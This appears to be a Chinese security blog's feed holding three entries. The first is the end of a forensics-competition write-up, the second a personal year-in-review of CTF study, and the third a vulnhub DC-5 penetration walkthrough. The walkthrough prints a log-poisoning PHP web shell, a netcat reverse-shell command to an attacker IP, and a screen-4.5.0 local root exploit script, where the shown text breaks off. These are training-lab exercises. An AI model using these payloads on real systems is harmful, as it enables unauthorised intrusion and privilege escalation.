title="41、受害人小浩的手机号码是多少（5分）"></a>41、受害人小浩的手机号码是多少（5分）</h3><pre><code>13533333333</code></pre><p>在检材三Filecomprss应用文件夹里面有一个<code>11月.txt</code>的文件 其实是一个被修改后缀名的压缩包 解压需要密码 Filecompress应该是一个压缩加密工具 需要我们对这个apk进行逆向 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401142357703.png" alt="image-20240114235746603"></p><p>找到密码<code>1!8Da9Re5it2b3a.</code> 解压后得到小浩的手机号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401142359667.png" alt="image-20240114235901635"></p><h3 id="42、完整的受害人名单是几个人。（6分）"><a href="#42、完整的受害人名单是几个人。（6分）" class="headerlink" title="42、完整的受害人名单是几个人。（6分）"></a>42、完整的受害人名单是几个人。（6分）</h3><pre><code>6</code></pre><p>按照上一题的思路 我们在11月.txt的文件中找到了两个受害人 而在检材一计算机的取证结果中 我们在最近访问的结果中看到了9月.txt和10月.txt 那猜测这两个文件中也有当月受害人的信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401151218108.png" alt="image-20240115121851995"></p><p>但是我们仿真计算机之后并没有找到这两个文件 反而在最近使用文件中找到了一个大小很可疑的<code>新建文本文档.txt</code> 猜测是VC容器</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401151234092.png" alt="image-20240115123438031"></p><p>在第33题中 我们找到了检材四备忘录的内容是<code>Vcpswd:edgewallet </code> 那看来VC容器的挂载密码应该和edgewallet的密码有关 </p><p>在检材一的edge浏览器保存的密码中可以找到edgewallet的账号密码 <code>tiga.ultraman@outlook.com\pR7)nZ5&amp;yQ2-oR0&lt;</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401151237617.png" alt="image-20240115123741561"></p><p>尝试使用这个密码对VC容器进行挂载 挂载成功</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401151238728.png" alt="image-20240115123840686"></p><p>9月.txt和10月.txt 都在里面 其中9月.txt可以直接打开 10月.txt和11月.txt一样是一个修改了后缀名的压缩包 加密方式和加密密码与11月.txt一样 解压之后就可以得到真正的10月.txt</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401151241106.png" alt="image-20240115124149063"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401151242669.png" alt="image-20240115124200645"></p><p>所以受害人一共有6人</p><h3 id="43、受害人转账的总金额是多少（5分）"><a href="#43、受害人转账的总金额是多少（5分）" class="headerlink" title="43、受害人转账的总金额是多少（5分）"></a>43、受害人转账的总金额是多少（5分）</h3><pre><code>600</code></pre><p>在给出的苹果手机备份和后面找到的加密手机备份中都可以找到嫌疑人向受害人索要钱财的聊天记录 分为3次 每次200 一共600元</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132334900.png" alt="image-20240113233409862"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132334979.png" alt="image-20240113233422928"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401132333685.png" alt="image-20240113233355630"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.这次学到了很多新的做题方法</p><p>（1）在bitlocker密钥爆破时间很长时 可以先使用取证大师的内存解析工具从内存中找一找密钥文件</p><p>（2）遇到苹果加密备份 使用passwarekit爆破<code>Manifest.pslist</code>文件 得到密钥 在工具中解密备份在分析</p><p>（3）遇到大的内存镜像 vol2分析不了 vol3在虚拟机中不方便拖动镜像  可以先用取证大师和火眼的内存解析工具分析 两者结合起来看 </p><p>（4）遇到安卓手机bak备份文件 先使用7zip全部解压 再把解压后的文件拖进火眼里面分析即可</p><p>（5）多注意检材间的联系 同时要擅长发现vc tc等加密容器</p><p>（6）一些加密密钥有的时候可以通过逆向分析的方法来获得</p><p>2.大题的做题思路是：</p><p>（1）对检材一到四正常分析</p><p>（2）根据题目提示和内存镜像爆破结果发现嫌疑人曾搜索过“ios备份密码忘了怎么办 五位纯数字”，分析可能还有一个加密ios备份，在检材1嵌套证据文件中找到该加密备份，对该备份进行正常的数据解密、获取和分析。</p><p>（3）在家米备份中找到小西米语音的账号密码 根据题目提示也知道小西米语音的聊天记录中有东西 由此找到嫌疑人约定的电子钱包品牌和比例</p><p>（4）在检材四分析FileCompress时找到一个11月.txt 发现是加密压缩包 通过逆向分析FileCompress软件 找到压缩包密码 由此找到11月的受害人名单</p><p>（5）在检材一的最近访问项目中还存在10月.txt和9月.txt  但是找不到这两个文件 进一步发掘找到新建文本文档.txt 这个VC容器 在检材四的备忘录中提示VC容器密码 得到密码 挂载容器 找到完整的受害人名单</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2023中科实数杯&quot;&gt;&lt;a href=&quot;#2023中科实数杯&quot; class=&quot;headerlink&quot; title=&quot;2023中科实数杯&quot;&gt;&lt;/a&gt;2023中科实数杯&lt;/h1&gt;&lt;p&gt;当时比赛在学校的训练馆里面 巨冷 直接被造成魔法伤害 还由于笔记本内存太小 火眼取证</summary>
      
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
    <category term="ios加密备份" scheme="http://w3nx1z1.github.io/tags/ios%E5%8A%A0%E5%AF%86%E5%A4%87%E4%BB%BD/"/>
    
  </entry>
  
  <entry>
    <title>w3nx1z1的年度个人总结</title>
    <link href="http://w3nx1z1.github.io/2024/01/01/2023%E5%B9%B4%E5%BA%A6%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/"/>
    <id>http://w3nx1z1.github.io/2024/01/01/2023%E5%B9%B4%E5%BA%A6%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/</id>
    <published>2023-12-31T17:21:44.200Z</published>
    <updated>2023-12-31T17:24:29.829Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2023年度个人总结"><a href="#2023年度个人总结" class="headerlink" title="2023年度个人总结"></a>2023年度个人总结</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><pre><code>第一次写年度总结，倒也没有什么别的想法，只是觉得是时候总结给自己接触ctf，接触网络安全这一年一个小总结了。是的，是时候了。</code></pre><h2 id="探索"><a href="#探索" class="headerlink" title="探索"></a>探索</h2><p>本身我在进入大学之前是完全没有计算机基础的。很难想象我在高考报志愿的时候没有报一个计算机方向的专业，而且我本人当时也是非常抵触这个专业，感觉自己的脑子学不来，只是在提前批报了网安，也是单纯因为这个专业是你jd分最高的专业，而我当时是非常想学医的。所以也算是误打误撞走进这扇门的吧。</p><p>其实大一上学期本身是小学期再加上为时不短的军训，在通过纳新赛加入信息安全社团之后没多长时间，由于疫情原因就回家了(现在还是非常怀念因为yq而可以提前回家的日子)，之后就是网课、复习、考试。可以说大一上学期不能称为一个正式对于安全学习的开始。</p><p>我个人感觉真正学习的开始，还是在寒假。当时社团里面也没有像我们现在对于23级的管理一样，规划好假期督促学习的一系列计划，完全就是散养哈哈哈。但说白了学习本身就是自己的事情，倒也无可厚非。虽然当时自己还是处于一个懵懂的状态，对于怎么去学习取证、怎么去学习ctf完全没有一个自己的方法。于是便从基础的python语言学起，这里真的感谢我尚青哥，不论是在进入社团之前还是进入社团之后前期的学习过程中都给了我很大帮助。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312312255741.png" alt="image-20231231225511655"></p><p>之后老师和学长们也给了一些资源，开始看取证和ctf的课程，再结合对比赛的复现和刷题，慢慢的自己也能做出来一些题了。ctf是选择了misc方向，听说misc打得好是可以成为全栈爷的hhh(绝对不是因为别的方向完全找不到入门的思路)</p><p>当时大大小小的比赛也参与了不少，记忆犹新就是西湖和春秋杯，真的只能签个到就润。做的稍微多一点的可能是nepnep战队办的CATCTF了吧，那也是第一次熬夜上分，大年三十上了一道新年题，本来已经要休息了，看到上新题了又爬起来看，没想到睡意全无就又冲了很长时间。</p><p>很快假期就结束了，又开始了高难度生活模式</p><h2 id="初具方向"><a href="#初具方向" class="headerlink" title="初具方向"></a>初具方向</h2><p>新学期开始之后，每天的生活也很简单，四点一线：食堂、宿舍、教学楼、实验室。基本上每天有空就去实验室，还是延续高中带来的那一套，学知识点、刷题、写wp，慢慢积累了很多misc的解题姿势也扩大了自己的脑洞。</p><p>带给我信心的一次比赛是山警举办的黄河流域网络空间安全技能挑战赛(后文简称”黄河流域“)。当时misc里面有一道是日卫星的题，做出来的人很少。我简单的搜了搜，发现有一道题和这道差不多，基本的原理和脚本都是大差不差的，于是下定决心要搞出来。可能放在现在看，当时那道题也没什么难的，但确实让我研究了一上午才搞出来。看着题目从灰色变为绿色，一种说不出来的成就感油然而生。虽然到最后也就出了一个web一个misc，同时也是感谢主办方给了大比例的获奖机会，拿到了人生中第一个ctf的奖。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312312330175.png" alt="image-20231231233001115"></p><p>也是从这一刻开始，下定决心要坚持把这条道阻且长的安全之路走下去。</p><h2 id="确定方向"><a href="#确定方向" class="headerlink" title="确定方向"></a>确定方向</h2><p>之后就是按部就班的学习，也慢慢开始混迹于各个ctf群，虽然到后来发现基本上每个群都是换群不换人hhh，进了一个新群好多都是眼熟的师傅。直到有一天，在一个群里看到了星盟安全团队在招人，当时抱着试试的想法，简单写了一份粗糙的简历便投上去了。</p><p>因为是misc方向，所以是Ba1_Ma0师傅来带的面试，虽然给我的两道题都只是有思路但没有解出来，但还是成功进入了主队，现在想想还是非常开心的。开始以为猫爷也是做misc的，但当看到猫爷的博客之后才发现这才是真正的全栈爷啊呜呜呜。</p><p>接到通过结果的那个中午，我整个人都高兴的要飞起。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312312340297.png" alt="image-20231231234026256"></p><p>但是很遗憾的是上半年国赛的成绩不是很理想，当时看了华北地区晋级榜单，好像就差50分一道题就可以进半决赛了，虽然前面有两只学长的队伍，就算我们勉强够上分数线也无法晋级线下就是了QAQ。</p><p>因此也意识到了只学misc还是有局限性的，于是开始了misc和web双修的过程，算是确定了方向。</p><h2 id="大一暑假"><a href="#大一暑假" class="headerlink" title="大一暑假"></a>大一暑假</h2><p>紧接着大一暑假学校安排了认知实习，非常幸运分到了网安大队，队里的大哥们人都很好，平时工作也不是很忙，还有专门的实验室，真的给我提供了一个非常优渥的学习环境。(队里的实验室真的是帅炸了)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312312343237.png" alt="image-20231231234341018"></p><p>在战队里面进步的速度还是很快的，认识了很多超强的师傅，战队里一些制度也让我更加勤奋的去学习，这段时间也是快速积累实力的时期。</p><h2 id="步入正轨"><a href="#步入正轨" class="headerlink" title="步入正轨"></a>步入正轨</h2><p>进入大二，因为某些不可抗因素吧，我担任了军训班长，在那一个月的时间里，基本上学习处于一个停摆的状态。每晚带完新生要到10点钟左右，我在回到宿舍抓紧学一会儿，那时候真的身心俱疲，在这种情况下，去参加了蓝帽杯半决赛，也是很遗憾，差5名没能进决赛，感觉非常对不住老师和我的两位队友。</p><p>带训过程也让我认识了很多对网安感兴趣的新生，我也不遗余力的宣传社团的事情，后面社团招新过程也是全程有参与，看到很多优秀的学弟学妹加入社团，我打心底的高兴。</p><p>下半年连续参加了三场线下赛(真不想算上中科实数)，蓝帽、美亚、冀信，哈尔滨、厦门、石家庄，打比赛的过程中也学到了很多东西，尤其是冀信，比赛前两天的渗透+应急响应培训扫盲效果还是很好的。本来说是要参加攻防演练，于是在当时就开始学习接触渗透的知识，跟着wp打了四五个靶场，收集了一些基本的渗透工具和做题思路。作为打得第一场渗透和应急响应比赛，在冀信杯的时候还算正常发挥。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401010038523.png" alt="image-20240101003816330"></p><p>打完冀信杯回学校后，就差不多该准备期末考试了，之后的一些ctf比赛也没怎么参加。这学期高强度的文化课让我实在是压力大，一学期的课都要在剩余的几天里突击完，属实是非常狼狈hhh</p><h2 id="总结与反思"><a href="#总结与反思" class="headerlink" title="总结与反思"></a>总结与反思</h2><p>回顾这一年的学习经历，其实不满意和意难平的地方还有很多。体制内学校繁杂的事务，往往让本就不多的学习时间更加碎片化。我自身的学习效率也是一个很大的问题，学到的东西还是太少了。在取证方面，还是太依赖自动化工具，参加过今年龙信杯、盘古石杯、美亚杯、中科实数杯等一系列取证比赛之后，不难看出日后取证比赛的出题趋势是向手工取证倾斜，常规的取证工具只能做出基础题甚至只能作为你取证的一个小依据。在取证这块还是应该深挖，否则难以跟上日渐增加的取证比赛难度，也难以增长自身实力。</p><p>不过学习就是这样子，和师傅们，和知识点们，和赛题们，你追我赶，只有存在挑战，才存在无限进步提升的可能。告别2023，拥抱2024，在新的一年里，无论是取证，还是ctf抑或是渗透，相信自己都能拿出全部的状态去学习，踏踏实实的掌握更多的技术，期待更精彩的未来！</p><h2 id="关于生活"><a href="#关于生活" class="headerlink" title="关于生活"></a>关于生活</h2><p>其实在学校里面的生活，大家应该懂的都懂，警务化管理下，活着已经是很棒了(bushi)日复一日的各种制度约束之下，或许只有在安全之路上的些许进步才能为我的生活激起一点涟漪。</p><p>精彩的部分还是在去线下比赛的日子里，比赛成绩先放一边，虽然每次可以出去的时间有限可以在大部分同学都只能待在学校的情况下，可以经由比赛和许多城市结缘，便足以让人羡慕。</p><ul><li><p>在哈尔滨逛中央大街</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401010105768.png" alt="image-20240101010558526"></p></li></ul><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401010106205.png" alt="image-20240101010609839"></p><ul><li>在厦门逛曾厝垵、坐船出海</li></ul><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401010107291.png" alt="image-20240101010710896"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401010107995.png" alt="image-20240101010720755"></p><ul><li>在石家庄(虽然没啥好玩的，但是每天吃的都很好)</li></ul><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401010108442.png" alt="image-20240101010818692"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401010108952.png" alt="image-20240101010835234"></p><p>希望新的一年中，自己可以除了学习之外，可以拿出一部分时间去多做运动，毕竟身体素质到最后联考的时候还是要达标的。也能将半年不玩的羽毛球重新拾起来，有时候真的希望时间可以拆成两半花啊</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>到这里，平平无奇的2023年度总结就要结束了，感谢自己能在2024年1月1号趁着还不算太晚将这篇年度总结写出来，也很感谢看到这里的大家。</p><p>感谢老师、学长学姐们的引导，让我打开安全这扇门，得以在大学生活中实现自己的价值，而不是随波逐流，虚度光阴。</p><p>也祝愿所有师傅们，在新的一年里，做自己想做的事，爱自己想爱的人，技术进步，生活顺利，一血拿到手软，挖洞随心所欲！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2023年度个人总结&quot;&gt;&lt;a href=&quot;#2023年度个人总结&quot; class=&quot;headerlink&quot; title=&quot;2023年度个人总结&quot;&gt;&lt;/a&gt;2023年度个人总结&lt;/h1&gt;&lt;h2 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;head</summary>
      
    
    
    
    <category term="随笔" scheme="http://w3nx1z1.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>vulnhub靶场记录DC-5</title>
    <link href="http://w3nx1z1.github.io/2023/12/05/vulnhub%E9%9D%B6%E5%9C%BADC-5%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
    <id>http://w3nx1z1.github.io/2023/12/05/vulnhub%E9%9D%B6%E5%9C%BADC-5%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</id>
    <published>2023-12-05T12:41:12.972Z</published>
    <updated>2024-01-15T09:34:42.239Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulnhub靶场DC-5通关记录"><a href="#vulnhub靶场DC-5通关记录" class="headerlink" title="vulnhub靶场DC-5通关记录"></a>vulnhub靶场DC-5通关记录</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-5 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.The plan was for DC-5 to kick it up a notch, so this might not be great for beginners, but should be ok for people with intermediate or better experience. Time will tell (as will feedback).As far as I am aware, there is only one exploitable entry point to get in (there is no SSH either). This particular entry point may be quite hard to identify, but it is there. You need to look for something a little out of the ordinary (something that changes with a refresh of a page). This will hopefully provide some kind of idea as to what the vulnerability might involve.And just for the record, there is no phpmailer exploit involved. :-)The ultimate goal of this challenge is to get root and to read the one and only flag.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.But if you&#39;re really, really stuck, you can watch this video which shows the first step.</code></pre><p>提到本次靶场中 不存在ssh服务</p><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>首先 给靶机开启NAT模式 使用nmap扫描靶机ip</p><pre><code>nmap 192.168.160.0/24</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121443158.png" alt="image-20231212144354908"></p><p>扫出来是<code>192.168.160.156</code></p><p>在扫描详细的端口信息</p><pre><code>nmap -A -p- -v 192.168.160.156</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121447097.png" alt="image-20231212144708011"></p><pre><code>开放了80端口 存在web服务 使用nginx中间件 版本是1.6.2开放了111端口 存在rpcbind服务 版本是2.4</code></pre><h4 id="了解一下rpcbind服务"><a href="#了解一下rpcbind服务" class="headerlink" title="了解一下rpcbind服务"></a>了解一下rpcbind服务</h4><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121514830.png" alt="image-20231212151438774"></p><p>这里要先说一下NFS文件系统 </p><pre><code>NFS(network file system)：网络文件系统。Linux下三大文件系统之一，采用C/S架构。允许网络中的计算机之间通过TCP/IP网络共享资源。在NFS应用中，本地NFS客户端可以透明的读写位于远端NFS服务器上的文件。NFS服务器主要进程1 rpc.nfsd 进程NFS 服务的主进程，主要管理客户端是否能够接入 NFS 服务器以及数据的传输。该进程固定监听 TCP/UDP 2049 端口。2 rpc.mountd 进程管理和维护 NFS 文件系统，根据所设定的权限决定是否允许客户端挂载指定的共享目录。该进程监听的端口默认是不固定的。3 rpc.lockd 进程提供文件锁功能，防止多个客户端同时写入一个文件。该进程监听的端口默认是不固定的。4 rpc.statd 进程负责检查数据的状态及一致性，需要与 rpc.lockd 配合使用。该进程监听的端口默认是不固定的。5 rpcbind 进程RPC 的端口映射器进程，监听 UDP 111 端口。NFS服务端机器：通过NFS协议将文件共享到网络上NFS客户端机器：通过网络挂载NFS共享目录到本地</code></pre><pre><code>RPC(Remote Procedure Call):远程过程调用协议NFS 只提供了基本的文件处理功能，而不提供任何 TCP/IP 数据传输功能。它需要借助 RPC 协议才能实现 TCP/IP 数据传输功能。RPC 最主要的功能就是在指定每个 NFS 功能所对应的端口序号（port number ），并且回报给客户端，让客户端可以连结到正确的物理端口（port）上去。</code></pre><p>一般情况下 rpcbind服务运行在111、31端口  本次靶机的rpcbind服务就开在111端口上</p><p>在使用whatweb进行站点CMS识别</p><pre><code>whatweb -v 192.168.160.156</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121537393.png" alt="image-20231212153754332"></p><p>使用dirb 扫一下目录</p><pre><code>dirb http://192.168.160.156</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121540460.png" alt="image-20231212154018411"></p><p>没扫出来啥东西 </p><h3 id="二、访问web站点"><a href="#二、访问web站点" class="headerlink" title="二、访问web站点"></a>二、访问web站点</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121541907.png" alt="image-20231212154101840"></p><p>在contact页面 看到可以提交东西 尝试随便写点内容提交</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121552060.png" alt="image-20231212155206018"></p><p>发现跳转到thankyou.php 对于提交的内容 使用GET方式进行上传 </p><p>但是注意到 在提交之后下面的年份发生了变化 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121558821.png" alt="image-20231212155846787"></p><p>从2019年变为了2018年 </p><p>尝试刷新发现 即使不传入参数 只刷新页面 这个年份也会改变 怀疑存在文件包含 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121607142.png" alt="image-20231212160757111"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121608184.png" alt="image-20231212160809141"></p><h4 id="确认文件包含"><a href="#确认文件包含" class="headerlink" title="确认文件包含"></a>确认文件包含</h4><p>在使用dirsearch扫一下目录 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121605333.png" alt="image-20231212160553291"></p><pre><code>[16:04:27] 200 -    4KB - /contact.php                                      [16:04:28] 301 -  184B  - /css  -&gt;  http://192.168.160.156/css/             [16:04:36] 200 -    6KB - /faq.php                                          [16:04:38] 200 -   17B  - /footer.php                                       [16:04:44] 301 -  184B  - /images  -&gt;  http://192.168.160.156/images/       [16:04:44] 403 -  570B  - /images/                                          [16:05:30] 200 -  852B  - /thankyou.php </code></pre><p>扫出来这些页面 其中<code>contact.php faq.php thankyou.php</code> 都已经出现过  访问一下<code>footer.php</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121612336.png" alt="image-20231212161256301"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121613522.png" alt="image-20231212161303494"></p><p>刷新一次 年份就会发生变化 因此<code>thankyou.php</code>存在文件包含 包含的文件是<code>footer.php</code></p><h4 id="使用bp找到文件包含的变量名和包含值"><a href="#使用bp找到文件包含的变量名和包含值" class="headerlink" title="使用bp找到文件包含的变量名和包含值"></a>使用bp找到文件包含的变量名和包含值</h4><p>在<code>thankyou.php</code>页面抓个包 发送到爆破页面 构造一个文件包含的GET请求头</p><pre><code>?1=1</code></pre><p>使用集束炸弹模式(Cluster bomb) 进行爆破  集束炸弹模式是笛卡尔积的方式来进行爆破 最为全面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121946709.png" alt="image-20231212194645640"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121947345.png" alt="image-20231212194700279"></p><p>爆破出了8组值 成功包含出<code>/etc/passwd</code>文件 得知文件包含的变量名是<code>file</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121954440.png" alt="image-20231212195424378"></p><h4 id="进行日志包含"><a href="#进行日志包含" class="headerlink" title="进行日志包含"></a>进行日志包含</h4><p>在前面信息搜集的时候 我们得知 该站点使用的中间件是<code>nginx</code> nginx的日志一般在<code>/var/log/nginx/access.log</code>中 尝试进行包含</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312121959299.png" alt="image-20231212195953211"></p><p>根据日志包含的知识 http请求头中<code>user-agent</code>部分的内容会出现在日志中 我们就可以在<code>user-agent</code>中写入shell 在包含日志文件 执行shell</p><p>我们写入</p><pre><code>&lt;?php phpinfo(); ?&gt;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312122006456.png" alt="image-20231212200653362"></p><p>成功执行</p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>既然可以进行文件包含 我们直接在<code>user-agent</code>中写入shell</p><pre><code>&lt;?php passthru($_GET[&#39;123&#39;]); ?&gt;   // passthru的作用和system类似    使用GET方法123=nc%20192.168.160.131%201111%20-e%20%2fbin%2fbash或者&lt;?php eval($_GET[&#39;123&#39;]); ?&gt;使用GET方法123=system(&#39;nc%20192.168.160.131%201111%20-e%20%2fbin%2fbash&#39;);</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312122047915.png" alt="image-20231212204710758"></p><p>在kali攻击机上监听<code>1111</code>端口</p><pre><code>nc -lvvp 1111</code></pre><p>成功反弹shell</p><p>再创造一个交互式shell</p><pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131123536.png" alt="image-20231213112310481"></p><h3 id="三、提权"><a href="#三、提权" class="headerlink" title="三、提权"></a>三、提权</h3><h4 id="查看suid提权命令"><a href="#查看suid提权命令" class="headerlink" title="查看suid提权命令"></a>查看suid提权命令</h4><p>当前用户<code>www-data</code>还是一个低权限用户 我们先找一下在当前用户可以使用suid提权的命令</p><pre><code>find / -type f -perm -u=s 2&gt;dev/null</code></pre><pre><code>/bin/su            /bin/mount        /bin/umount       /bin/screen-4.5.0 /usr/bin/gpasswd  /usr/bin/procmail  /usr/bin/at        /usr/bin/passwd   /usr/bin/chfn /usr/bin/newgrp        /usr/bin/chsh                /usr/lib/openssh/ssh-keysign       /usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/sbin/exim4/sbin/mount.nfs</code></pre><p>看到了在DC-4中 我们使用过的老朋友<code>exim4</code>  我们先试试这次<code>exim4</code>是否也可以成功提权</p><h4 id="exim4提权"><a href="#exim4提权" class="headerlink" title="exim4提权"></a>exim4提权</h4><h5 id="1-查找漏洞利用脚本"><a href="#1-查找漏洞利用脚本" class="headerlink" title="1.查找漏洞利用脚本"></a>1.查找漏洞利用脚本</h5><p>先查看靶机中<code>exim4</code>命令的版本</p><pre><code>exim4 --version</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131307143.png" alt="image-20231213130751087"></p><p>得知是<code>4.84-2</code>的版本</p><p>使用<code>searchsploit</code>找一下漏洞利用脚本</p><pre><code>searchsploit exim 4.8</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131501264.png" alt="image-20231213150149193"></p><p>但是很可惜 并没有找到合适版本的exim4漏洞利用脚本</p><h5 id="2-exim4提权失败"><a href="#2-exim4提权失败" class="headerlink" title="2.exim4提权失败"></a>2.exim4提权失败</h5><h4 id="screen-4-5-0-提权"><a href="#screen-4-5-0-提权" class="headerlink" title="screen-4.5.0 提权"></a>screen-4.5.0 提权</h4><p>在前面查看suid提权命令的时候 还发现一个<code>screen-4.5.0 </code> </p><pre><code>GNU Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。screen命令虚拟了一个终端(session)，可在终端内运行命令，多次运行screen命令可以虚拟多个不同的终端；每个session可以开启多个窗口，每个窗口有自己的shell，可以在不同的窗口中同时运行多个命令，每个命令都相当于在前台运行，可以与用户交互；</code></pre><h5 id="1-查找漏洞利用脚本-1"><a href="#1-查找漏洞利用脚本-1" class="headerlink" title="1.查找漏洞利用脚本"></a>1.查找漏洞利用脚本</h5><pre><code>searchsploit screen 4.5.0</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202312131517098.png" alt="image-20231213151707051"></p><p>找到两个权限提升的漏洞利用脚本 </p><h5 id="2-将漏洞利用脚本保存到攻击机"><a href="#2-将漏洞利用脚本保存到攻击机" class="headerlink" title="2.将漏洞利用脚本保存到攻击机"></a>2.将漏洞利用脚本保存到攻击机</h5><pre><code>searchsploit -p linux/local/41154.shsearchsploit -p linux/local/41152.txtcp /usr/share/exploitdb/exploits/linux/local/41154.sh 41154.shcp /usr/share/exploitdb/exploits/linux/local/41152.txt 41152.txt</code></pre><h5 id="3-查看41154-sh"><a href="#3-查看41154-sh" class="headerlink" title="3.查看41154.sh"></a>3.查看41154.sh</h5><pre><code class="sh">#!/bin/bash# screenroot.sh# setuid screen v4.5.0 local root exploit# abuses ld.so.preload overwriting to get root.# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html# HACK THE PLANET# ~ infodox (25/1/2017)echo &quot;~ gnu/screenroot ~&quot;echo &quot;[+] First, we create our shell and library...&quot;cat &lt;&lt; EOF &gt; /tmp/libhax.c#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;__attribute__ ((__constructor__))void dropshell(void)&#123;    chown(&quot;/tmp/rootshell&quot;, 0, 0);    chmod(&quot;/tmp/rootshell&quot;, 04755);    unlink(&quot;/etc/ld.so.preload&quot;);    printf(&quot;[+] done!\n&quot;);&#125;EOFgcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.crm -f /tmp/libhax.ccat &lt;&lt; EOF &gt; /tmp/rootshell.c#include &lt;stdio.h&gt;int main(void)&#123;    setuid(0);    setgid(0);    seteuid(0);    setegid(0);    execvp(&quot;/bin/sh&quot;, NULL, NULL);&#125;EOFgcc -o /tmp/rootshell /tmp/rootshell.crm -f /tmp/rootshell.cecho &quot;[+] Now we create our /etc/ld.so.preload file...&quot;cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne  